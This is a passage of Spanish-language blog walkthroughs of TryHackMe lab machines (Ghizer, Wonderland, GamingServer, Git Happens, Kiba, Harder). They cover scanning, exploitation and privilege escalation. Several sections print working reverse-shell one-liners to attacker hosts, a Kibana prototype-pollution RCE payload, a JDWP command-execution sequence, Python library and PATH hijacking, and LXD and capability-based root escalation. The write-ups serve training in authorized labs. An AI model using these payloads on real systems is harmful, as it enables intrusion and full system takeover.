SF:ionReq,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFT SF:Pd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(Kerberos,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x2 SF:0FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(SMBProgNeg,33,\u0026#34;220\\x20Wel SF:come\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r SF:(X11Probe,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(v SF:sFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PA SF:SS\\.\\n\u0026#34;)%r(FourOhFourRequest,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20F SF:TP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x SF:20USER\\x20and\\x20PASS\\.\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .   FTP Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous) en el cual encontramos varios archivos entre ellos las flag root.txt y user.txt, al intentar obtener uno de estos archivos muestra un mensaje de permiso denegado por lo que no logramos hacer nada en este servicio, además es muy raro porque comunmente es posible realizar ls -lah para observar los archivos ocultos, algo que no se pudo lograr en este servicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  kali@kali:~/thm/ghizer$ ftp ghizer.thm Connected to ghizer.thm. 220 Welcome to Anonymous FTP server (vsFTPd 3.0.3) Name (ghizer.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -r-x------ 1 0 0 1351 Feb 7 2019 client.py -r-x------ 1 0 0 54324 Feb 7 2019 test.c -r-x------ 1 0 0 1024 Nov 28 2019 prototype.c -rwx------ 1 0 0 4096 Jan 4 2019 root.txt -r-x------ 1 0 0 45550 Dec 12 2019 user.txt -r-x------ 1 0 0 45550 Dec 12 2019 i_honeypot.py 226 Directory send OK. ftp\u0026gt; get user.txt local: user.txt remote: user.txt Permission denied. 200 PORT command successful. Consider using PASV. 550 Permission denied. ftp\u0026gt; pwd 257 \u0026#34;/home/lucrecia/ftp/\u0026#34; is the current directory ftp\u0026gt; get root.txt local: root.txt remote: root.txt Permission denied. 200 PORT command successful. Consider using PASV. 550 Permission denied. ftp\u0026gt; bye 221 Goodbye. kali@kali:~/thm/ghizer$   HTTP Encontramos una pagina web en el puerto 80, al parecer es una aplicacion web para realizar encuestas.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  kali@kali:~/thm/ghizer$ gobuster dir -u http://ghizer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt /index.php (Status: 200) /docs (Status: 301) /themes (Status: 301) /admin (Status: 301) /assets (Status: 301) /upload (Status: 301) /tests (Status: 301) /plugins (Status: 301) /application (Status: 301) /tmp (Status: 301) /framework (Status: 301) /locale (Status: 301) /installer (Status: 301) /third_party (Status: 301) /server-status (Status: 403)   LimeSurvey - RCE Encontramos un exploit que afecta a esta aplicacion la cual necesita unas credenciales para subir una shell y ejecutar comandos, utilizamos las credenciales por defecto y ejecutamos el exploit con los parametros necesarios. Vemos que el usuario que esta ejecutando la aplicacion es www-data.\nActualizamos a una nueva shell en donde podamos realizar una enumeracion más comoda ejecutando una shell inversa de python.\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.2.29.162\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   GHIDRA RCE -\u0026gt; VERONICA Realizamos una enumeracion en la maquina y vemos que en el directorio principal de la usuario veronica esta Ghidra, además de ello vemos los puertos abiertos en la maquina (ojo con 18001).\nExploramos las vulnerabilidades en ghidra y al principio vimos el exploit Ghidra (Linux) 9.0.4 - .gar Arbitrary Code Execution que necesita un archivo de project.gar el cual se puede crear en Ghidra a partir de un proyecto, pero este exploit necesita una interaccion con la interfaz visual de Ghidra. Tambien encontramos la vulnerabilidad Remote Code Execution Through JDWP Debug Port el cual afecta a la version 9.0.4. En esta vulnerabilidad Ghidra abre en modo debug JDWP lo cual permite conectarse al puerto 18001 de localhost.\nTenemos acceso al puerto (18001) localmente con la shell actual por lo que realizamos la explotacion como en la demostracion de la exploitacion, a continuacion los comandos.\n1 2 3 4 5 6 7  #Conexion a jdwp jdb -attach localhost:18001 #Listar las clases disponibles #classpath stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() #Ejecucion de la shell inversa print new java.lang.Runtime().exec(\u0026#34;nc 10.10.10.10 1337 -e /bin/sh\u0026#34;)   Logramos obtener nuestra flag user.txt y una shell con la usuario Veronica.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en la carpeta principal de veronica y vemos un script en python el cual codifica el mensaje tryhackme is the best y además la variable podria darnos una pista de lo que debemos de hacer.\n1 2 3 4  import base64 hijackme = base64.b64encode(b\u0026#39;tryhackme is the best\u0026#39;) print(hijackme)   Además vemos un cron que ejecuta el usuario root.\nTambien al realizar sudo -l -l vemos que podemos ejecutar /usr/bin/python3.5 /home/veronica/base.py con sudo.\nCreamos el archivo base64.py en donde colocamos una shell inversa para realizar Python Library Hijacking.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  import os import pty import socket lhost = \u0026#34;10.10.10.10\u0026#34; lport = 1337 ZIP_DEFLATED = 0 class ZipFile: def close(*args): return def write(*args): return def __init__(self, *args): return s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) s.close()   Ejecutamos el script con python3 y sudo, ponemos a la escucha netcat en nuestra maquina y logramos obtener una shell con usuario root y nuestra flag root.txt.\nANEXO HONEYPOT - FTP Al parecer el servicio FTP expuesto en la maquina es un honeypot llamado Lucrecia.\nAdemás el cron que encontramos era para ejecutar el honeypot.\n1 2 3 4 5  root@ubuntu:/root/Lucrecia# cat lucre.sh cat lucre.sh ufw disable sleep 3 python3 lucrecia.py -f server.conf   TASK 1 Al obtener una shell es posible obtener las credenciales en \u0026hellip;\nSPOILER   SOPOILER  limesurvey/application/config\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  veronica@ubuntu:/var/www/html/limesurvey/application/config$ cat config.php cat config.php \u0026lt;?php if (!defined(\u0026#39;BASEPATH\u0026#39;)) exit(\u0026#39;No direct script access allowed\u0026#39;); /* | ------------------------------------------------------------------- | DATABASE CONNECTIVITY SETTINGS | ------------------------------------------------------------------- | This file will contain the settings needed to access your database. | | For complete instructions please consult the \u0026#39;Database Connection\u0026#39; | page of the User Guide. | | ------------------------------------------------------------------- | EXPLANATION OF VARIABLES | ------------------------------------------------------------------- | | \u0026#39;connectionString\u0026#39; Hostname, database, port and database type for | the connection. Driver example: mysql. Currently supported: | mysql, pgsql, mssql, sqlite, oci | \u0026#39;username\u0026#39; The username used to connect to the database | \u0026#39;password\u0026#39; The password used to connect to the database | \u0026#39;tablePrefix\u0026#39; You can add an optional prefix, which will be added | to the table name when using the Active Record class | */ return array( \u0026#39;components\u0026#39; =\u0026gt; array( \u0026#39;db\u0026#39; =\u0026gt; array( \u0026#39;connectionString\u0026#39; =\u0026gt; \u0026#39;mysql:host=localhost;port=3306;dbname=limedb;\u0026#39;, \u0026#39;emulatePrepare\u0026#39; =\u0026gt; true, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;[... REDACTED ...]\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;[... REDACTED ...]\u0026#39;, \u0026#39;charset\u0026#39; =\u0026gt; \u0026#39;utf8mb4\u0026#39;, \u0026#39;tablePrefix\u0026#39; =\u0026gt; \u0026#39;lime_\u0026#39;, ), // Uncomment the following lines if you need table-based sessions. // Note: Table-based sessions are currently not supported on MSSQL server. // \u0026#39;session\u0026#39; =\u0026gt; array ( // \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;application.core.web.DbHttpSession\u0026#39;, // \u0026#39;connectionID\u0026#39; =\u0026gt; \u0026#39;db\u0026#39;, // \u0026#39;sessionTableName\u0026#39; =\u0026gt; \u0026#39;{{sessions}}\u0026#39;, // ), \u0026#39;urlManager\u0026#39; =\u0026gt; array( \u0026#39;urlFormat\u0026#39; =\u0026gt; \u0026#39;path\u0026#39;, \u0026#39;rules\u0026#39; =\u0026gt; array( // You can add your own rules here ), \u0026#39;showScriptName\u0026#39; =\u0026gt; true, ), ), // For security issue : it\u0026#39;s better to set runtimePath out of web access // Directory must be readable and writable by the webuser // \u0026#39;runtimePath\u0026#39;=\u0026gt;\u0026#39;/var/limesurvey/runtime/\u0026#39; // Use the following config variable to set modified optional settings copied from config-defaults.php \u0026#39;config\u0026#39;=\u0026gt;array( // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory // on your webspace. // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates \u0026#39;debug\u0026#39;=\u0026gt;0, \u0026#39;debugsql\u0026#39;=\u0026gt;0, // Set this to 1 to enanble sql logging, only active when debug = 2 // Update default LimeSurvey config here ) ); /* End of file config.php */ /* Location: ./application/config/config.php */      TASK 2 En el puerto 443 o https encontramos un mensaje en el index, donde indica que la pagina del login de wordpress ha sido escondida con el plugin WPS Hide Login \u0026hellip;\nSPOILER   SOPOILER  \u0026hellip; es posible encontrar la pagina de login en el footer.\n  ","description":"Ghizer es una maquina de TryHackMe, encontramos un HoneyPot en el puerto FTP. Explotamos un RCE en LimeSurvey lo que nos dio acceso a la maquina. Encontramos JDWP el cual nos conectamos para obtener acceso al siguiente usuario. Tenemos permisos para ejecutar un script con Python3 al cual realizamos Python Library Hijacking para escalar privilegios.","id":43,"section":"posts","tags":["python library hijacking","ftp","LimeSurvey","ghidra","jdb"],"title":"TryHackMe - Ghizer","uri":"https://sckull.github.io/posts/ghizer/"},{"content":"  Wonderland es una maquina de TryHackMe, presenta un reto de Esteganografia que nos dio un tipo de pista. Tras enumerar la pagina web encontramos credenciales para acceder por SSH. Cambiamos a un segundo usuario modificando un script para realizar Python Library Hijacking. Modificando la variable PATH conseguimos una shell al siguiente usuario. Finalmente con las Capabilities de Perl obtuvimos acceso como root.\nRoom    Titulo Wonderland      Descripción Fall down the rabbit hole and enter wonderland.   Puntos 80   Dificultad Media   Maker NinjaJc01     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Tue Sep 1 00:47:40 2020 as: nmap -Pn -sV -o mini_scan wonderland.thm Nmap scan report for wonderland.thm (10.10.220.104) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 1 00:49:59 2020 -- 1 IP address (1 host up) scanned in 138.96 seconds   HTTP Encontramos una pagina web en el puerto 80.\nEncontramos una imagen en la pagina, la descargamos, analizamos y encontramos un archivo dentro de la imagen el cual nos da una pista.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  kali@kali:~/thm/wonderland$ steghide info white_rabbit_1.jpg \u0026#34;white_rabbit_1.jpg\u0026#34;: format: jpeg capacity: 99.2 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;hint.txt\u0026#34;: size: 22.0 Byte encrypted: rijndael-128, cbc compressed: yes kali@kali:~/thm/wonderland$ steghide extract -sf white_rabbit_1.jpg Enter passphrase: wrote extracted data to \u0026#34;hint.txt\u0026#34;. kali@kali:~/thm/wonderland$ cat hint.txt follow the r a b b i t kali@kali:~/thm/wonderland$   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5  kali@kali:~/thm/wonderland$ gobuster dir -u http://wonderland.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /img (Status: 301) /index.html (Status: 301) /index.html (Status: 301) /r (Status: 301)   STEGANOGRAFIA En /img encontramos dos imagenes nuevas, utilizamos steghide y binwalk pero no encontramos nada interesante dentro de estas imagenes.\nEn /r solo encontramos una frase, ejecutamos gobuster nuevamente en este directorio.\nEncontramos /r/a y nuevamente una frase.\nEncontramos nuevamente una frase en /r/a/b/ al pasarle gobuster /r/a/.\nAl pasarle nuevamente a /r/a/b/ encontramos /r/a/b/b/ lo cual indica que la palabra que forma estos directorios es rabbit el cual es la pista que encontramos en la imagen. Al visitar /r/a/b/b/i/t/ vemos una nueva pagina con una imagen nueva.\nAdemás vemos lo que parecen ser unas credenciales escondidas.\nALICE - USER Utilizamos estas credenciales en el servicio ssh y logramos obtener una shell con la usuario Alice.\nRealizamos una enumeracion con sudo -l -l y vemos que podemos ejecutar python3 con el script walrus_and_the_carpenter.py con el usuario rabbit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  import random poem = \u0026#34;\u0026#34;\u0026#34;The sun was shining on the sea, Shining with all his might: He did his very best to make The billows smooth and bright — And this was odd, because it was The middle of the night. [... REDACTED ...] \u0026#34;O Oysters,\u0026#34; said the Carpenter. \u0026#34;You’ve had a pleasant run! Shall we be trotting home again?\u0026#34; But answer came there none — And that was scarcely odd, because They’d eaten every one.\u0026#34;\u0026#34;\u0026#34; for i in range(10): line = random.choice(poem.split(\u0026#34;\\n\u0026#34;)) print(\u0026#34;The line was:\\t\u0026#34;, line)   Encontramos tambien a perl con \u0026ldquo;capabilites\u0026rdquo; pero al intentar utilizar este nos mostró que no tenemos permisos.\nRABBIT - USER El script importa la libreria random, por lo cual se podria realizar Python Library Hijacking. Intentamos crear el archivo import.py con una shell inversa dentro, ejecutamos sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py pero la shell moría al conectarse. Ya que tenemos una shell ssh, ejecutamos /bin/bash el cual nos devolveria una shell con el usuario rabbit.\n1 2  echo \u0026#34;import os; os.system(\u0026#39;/bin/bash\u0026#39;);\u0026#34; \u0026gt; random.py sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py   Realizamos una enumeracion con este archivo y encontramos teaParty el cual copiamos a nuestra maquina para analizarlo.\nAl ejecutar strings vemos que posiblemente se realiza una ejecucion de echo y date, pero hay que tomar encuenta que echo lleva el PATH/direccion del mismo y date no.\nEl codigo fuente generado por Ghidra nos indica que si realiza la ejecucion de echo y date.\n1 2 3 4 5 6 7 8 9 10 11 12  void main(void) { setuid(0x3eb); setgid(0x3eb); puts(\u0026#34;Welcome to the tea party!\\nThe Mad Hatter will be here soon.\u0026#34;); system(\u0026#34;/bin/echo -n \\\u0026#39;Probably by \\\u0026#39;\u0026amp;\u0026amp; date --date=\\\u0026#39;next hour\\\u0026#39;-R\u0026#34;); puts(\u0026#34;Ask very nicely, and I will give you some tea while you wait for him\u0026#34;); getchar(); puts(\u0026#34;Segmentation fault (core dumped)\u0026#34;); return; }   Primero, intentamos utilizar nuevamente perl pero, no tenemos permiso.\nHATTER - USER Realizamos \u0026quot;Hijacking PATH\u0026quot;, el objetivo es date ya que toma el $PATH/date actual del usuario que lo ejecuta. Para ello modificamos la variable $PATH agregando al principio una direccion a conveniencia, en este caso el directorio principal de rabbit en el que seguidamente creamos el archivo date el cual ejecutará /bin/bash y para finalizar hacemos ejecutable tal archivo.\n1 2 3 4 5 6 7 8  #Hijacking PATH export PATH=/home/rabbit:$PATH echo $PATH echo \u0026#34;/bin/bash\u0026#34; \u0026gt; date chmod +x date #Binario /home/rabbit/teaParty   Ejecutamos el binario teaParty el cual nos devuelve una shell con el usuario Hatter.\nPRIVILEGE ESCALATION Intentamos ejecutar perl ya que tiene \u0026ldquo;capabilites\u0026rdquo; cap_setuid+ep que al intentarlo con alice y rabbit no fue posible tomar ventaja. Logramos obtener una shell con usuario root y obtener nuestras flags user.txt y root.txt.\n1  /usr/bin/perl -e \u0026#39;use POSIX (setuid); POSIX::setuid(0); exec \u0026#34;/bin/bash\u0026#34;;\u0026#39;   Info\n Linux Privilege Escalation Using PATH Variable Linux Privilege Escalation using Capabilities  ","description":"Wonderland es una maquina de TryHackMe, presenta un reto de Esteganografia que nos dio un tipo de pista. Tras enumerar la pagina web encontramos credenciales para acceder por SSH. Cambiamos a un segundo usuario modificando un script para realizar Python Library Hijacking. Modificando la variable PATH conseguimos una shell al siguiente usuario. Finalmente con las Capabilities de Perl obtuvimos acceso como root.","id":44,"section":"posts","tags":["capabilities","python library hijacking","hijacking PATH"],"title":"TryHackMe - Wonderland","uri":"https://sckull.github.io/posts/wonderland/"},{"content":"  GamingServer es una maquina de TryHackMe, en la enumeracion de la pagina web encontramos una clave privada encriptada que crackeamos para obtener acceso a la maquina. Escalamos privilegios con LXC creando un nuevo contenedor.\nRoom    Titulo GamingServer      Descripción An Easy Boot2Root box for beginners   Puntos 110   Dificultad Facil   Maker SuitGuy     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Mon Aug 31 21:03:37 2020 as: nmap -sV -o mini_scan gaming.thm Nmap scan report for gaming.thm (10.10.202.248) Host is up (0.28s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 31 21:04:17 2020 -- 1 IP address (1 host up) scanned in 39.71 seconds   HTTP Encontramos una pagina web en el puerto 80.\nEn el codigo fuente encontramos un posible nombre de usuario comentado.\n1 2 3  \u0026lt;/body\u0026gt; \u0026lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --\u0026gt; \u0026lt;/html\u0026gt;   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10  kali@kali:~/thm/gamingserver$ gobuster dir -u http://gaming.thm/ -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt /about.php (Status: 200) /about.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /secret (Status: 301) /server-status (Status: 403) /uploads (Status: 301)   En /secret encontramos una clave privada encriptada seguramente de alguno de los usuarios dentro de la maquina. Utilizamos John para obtener la frase de la clave privada.\nEn /uploads/ encontramos varios archivos entre ellos un posible wordlist.\nJOHN - USER Utilizamos la clave privada y la frase que encontramos con el usuario john en el servicio ssh y logramos obtener una shell y nuestr flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion, vemos que el usuario se encuentra en el grupo de lxd. Utilizamos LXD para realizar privilege escalation al igual que THM - HA Joker CTF.\n1 2 3 4 5 6 7 8 9 10 11 12 13  #LOCAL git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine -a i686 #GAMINSERVER MACHINE lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage lxc image list lxc init myimage sckull -c security.privileged=true lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true lxc start sckull lxc exec sckull /bin/sh   Logramos obtener una shell con usuario root (container) y nuestra flag root.txt.\n","description":"GamingServer es una maquina de TryHackMe, en la enumeracion de la pagina web encontramos una clave privada encriptada que crackeamos para obtener acceso a la maquina. Escalamos privilegios con LXC creando un nuevo contenedor.","id":45,"section":"posts","tags":["lxc","john"],"title":"TryHackMe - GamingServer","uri":"https://sckull.github.io/posts/gamingserver/"},{"content":"  Git Happens es una maquina de TryHackMe el cual expone un .git y donde utilizando GitTools para obtener informacion.\nRoom    Titulo Git Happens      Descripción Boss wanted me to create a prototype, so here it is! We even used something called \u0026ldquo;version control\u0026rdquo; that made deploying this really easy!   Puntos 80   Dificultad Facil   Maker hydragyrum     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10  # Nmap 7.80 scan initiated Mon Aug 31 17:41:27 2020 as: nmap -sV -o mini_scan git.thm Nmap scan report for git.thm (10.10.187.108) Host is up (0.33s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http nginx 1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 31 17:42:05 2020 -- 1 IP address (1 host up) scanned in 38.04 seconds   HTTP Encontramos una pagina web con un panel en el puerto 80.\nEn el codigo fuente de la pagina encontramos codigo javascript ofuscado, con un array que contiene informacion \u0026ldquo;desordenada\u0026rdquo;.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6  kali@kali:~/thm/githappens$ gobuster dir -u http://git.thm/ -w $LIST/dirb/common.txt -q -t 25 -x php,html,txt /.git/HEAD (Status: 200) /css (Status: 301) /dashboard.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200)   GITTOOLS Encontramos el directorio .git con gobuster, utilizamos GitTools al igual que en Harder de TryHackme para obtener la informacion expuesta disponible.\n1  ~/tools/GitTools/Dumper/gitdumper.sh http://git.thm/.git/ .   Una vez utilizado el Dumper ejecutamos el Extractor de GitTools o podemos utilizar el propio Git para recuperar la informacion.\n1 2 3 4 5  #Git Extractor ~/tools/GitTools/Extractor/extractor.sh . . #Git git checkout -- .   Vemos en uno de los archivos anteriores el usuario y contraseña el cual es el objetivo de esta sala.\n","description":"Git Happens es una maquina de TryHackMe el cual expone un .git y donde utilizando GitTools para obtener informacion.","id":46,"section":"posts","tags":["gittools"],"title":"TryHackMe - Git Happens","uri":"https://sckull.github.io/posts/githappens/"},{"content":"  Kiba es una maquina de TryHackMe, involucra la explotacion de una vulnerabilidad en Kibana que permitió acceso con una shell inversa. Descubrimos un fichero con capabilities steuid para escalar privilegios.\nRoom    Titulo kiba      Descripción Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.   Puntos 480   Dificultad Facil   Maker stuxnet     NMAP \u0026amp; MASSCAN Escaneo de puertos tcp, nmap nos muestra el puerto 5601, puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # Nmap 7.80 scan initiated Mon Aug 31 18:26:06 2020 as: nmap -sV -o mini_scan kiba.thm Nmap scan report for kiba.thm (10.10.22.111) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 31 18:26:43 2020 -- 1 IP address (1 host up) scanned in 37.55 seconds masscan -p1-65535,U:1-65535 10.10.22.111 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-31 22:51:38 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 5601/tcp on 10.10.22.111 Discovered open port 80/tcp on 10.10.22.111 Discovered open port 22/tcp on 10.10.22.111   HTTP Encontramos una pagina web en el puerto 80 con una imagen ASCII de Cicada y con una frase interesante \u0026quot;linux capabilities\u0026quot;.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.\n1 2 3 4  kali@kali:~/thm/kiba$ gobuster dir -u http://kiba.thm/ -w $LIST/dirb/common.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   HTTP PUERTO 5601 Encontramos el dashboard de kibana.\nRealizamos un query (_aliases y .kibana/_search ambos GET) en la consola de Dev Tools para ver la version de kibana y vemos que es 6.5.4.\nKIBANA \u0026lt; 6.6.0 - RCE Realizamos una busqueda de posibles exploits o vulnerabilidades para esta version de Kibana y encontramos un PoC que permite ejecutar comandos a traves de la \u0026ldquo;contaminacion de un objeto\u0026rdquo;. Encontramos informacion de otros dos payloads y de como parchar esta vulnerabilidad en Github.\nUtilizamos el payload para obtener una shell inversa con los pasos que se muestran en el slide y logramos obtener una shell.\n1 2  .es(*).props(label.__proto__.env.AAAA=\u0026#39;require(\u0026#34;child_process\u0026#34;).exec(\u0026#34;bash -c \\\u0026#39;bash -i\u0026gt;\u0026amp; /dev/tcp/10.10.10.10/12345 0\u0026gt;\u0026amp;1\\\u0026#39;\u0026#34;);//\u0026#39;) .props(label.__proto__.env.NODE_OPTIONS=\u0026#39;--require /proc/self/environ\u0026#39;)   Logramos obtener nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion y vemos algunas configuraciones realizadas en un archivo que se encuentra en la carpeta principal que esta relacionada con capabilities, lo cual esta relacionado con la frase que encontramos en la pagina del puerto 80.\nRealizamos una enumeracion con getcap -r / 2\u0026gt;/dev/null para verificar que el archivo visto en el historial contiene estas \u0026ldquo;capacidades\u0026rdquo; (similares a los SUID). Vemos que aparece junto a otros.\nRealizamos la explotacion de este archivo, que es python3 para obtener una shell root y nuestra flag root.txt.\n1  ./python3 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   Informacion:\n Capabilities - Privilege Escalation Capabilities - Privilege Escalation Kibana - PoC Kibana - Sad Vulnerabilities  ","description":"Kiba es una maquina de TryHackMe, involucra la explotacion de una vulnerabilidad en Kibana que permitió acceso con una shell inversa. Descubrimos un fichero con capabilities steuid para escalar privilegios.","id":47,"section":"posts","tags":["kibana","capabilities"],"title":"TryHackMe - Kiba","uri":"https://sckull.github.io/posts/kiba/"},{"content":"  Harder es una maquina de TryHackMe, utilizamos GitTools para obtener el codigo fuente de la pagina lo cual nos dio credenciales para acceder al portal el cual realizamos Bypass al WAF con ello obtuvimos acceso a la maquina para luego cambiar al siguiente usuario en contraseñas almacenadas. Escalamos privilegios utilizando gpg y un binario con permisos SUID.\nRoom    Titulo harder      Descripción Real pentest findings combined   Puntos 160   Dificultad Media   Maker arcc     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10  # Nmap 7.80 scan initiated Tue Aug 18 20:32:35 2020 as: nmap -sV -o mini_scan harder.thm Nmap scan report for harder.thm (10.10.254.174) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.3 (protocol 2.0) 80/tcp open http nginx 1.18.0 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 18 20:33:24 2020 -- 1 IP address (1 host up) scanned in 48.83 seconds   HTTP Encontramos una pagina web en el puerto 80.\nEn las cookies de la solicitud a la pagina encontramos un subdominio nuevo el cual agregamos a nuestro archivo /etc/hosts.\nHTTP - PWD En la pagina encontramos un panel de logeo, al ingresar credenciales por default nos muestra un mensaje.\nAl ingresar admin:admin nos muestra:\n1  extra security in place. our source code will be reviewed soon ...   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en el nuevo dominio.\n1 2 3 4 5 6  kali@kali:~/thm/harder$ gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/dirb/common.txt -t 250 -q -x php,html,txt -k /.git/HEAD (Status: 200) /auth.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /secret.php (Status: 200)   GITTOOLS Vemos que existe un directorio de .git o más bien un repositorio expuesto. Utilizamos GitTools para obtener lo que se pueda de este repositorio.\nDespues de realizar un git checkout -- . para recuperar algunos archivos vemos 3 de ellos .php.\nEn el archivo .gitignore vemos dos nombres de archivos, uno de ellos no lo tenemos.\nEl archivo index.php contiene tres parametros que son obtenidos a partir de la variable/array $creds y que seguramente se encuentran en credentials.php además de ello obtiene auth.php, hmac.php y credentials.php. El archivo auth.php vemos el codigo que realiza login, logout, verifica la contraseña y contine el formulario de logeo.\nindex.php auth.php  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  \u0026lt;?php session_start(); 